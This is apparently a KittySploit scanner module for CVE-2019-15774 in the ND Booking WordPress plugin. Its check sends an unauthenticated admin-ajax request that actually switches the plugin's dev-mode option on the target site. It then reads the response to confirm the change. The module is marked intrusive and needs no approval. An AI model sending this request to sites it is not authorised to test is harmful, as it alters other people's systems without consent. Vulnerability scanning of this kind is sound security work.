#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Hotel Booking WordPress plugin ND Booking < 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ND Booking < 2.5 - Unauthenticated Options Change Detection',
        'description': 'The Hotel Booking WordPress plugin ND Booking < 2.5 was affected by an Unauthenticated Options Change security vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'wp-plugin', 'nd-booking', 'intrusive', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/fb211b8b-5c32-40df-b197-bb51fc672b4b/',
            'https://blog.nintechnet.com/privilege-escalation-vulnerability-in-wordpress-nd-booking-plugin/',
        ],
        'cve': 'CVE-2019-15774',
    }

    def run(self):
        path = '/wp-content/plugins/nd-booking/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/wp-admin/admin-ajax.php?action=nd_booking_import_settings_php_function&nd_booking_value_import_settings=nd_booking_plugin_dev_mode%5Bnd_booking_option_value%5D1'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Updated option "nd_booking_plugin_dev_mode" with the same value.', 'Updated option "nd_booking_plugin_dev_mode" with 1.',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='ND Booking < 2.5 - Unauthenticated Options Change detected', path=path)
            return True
        return False

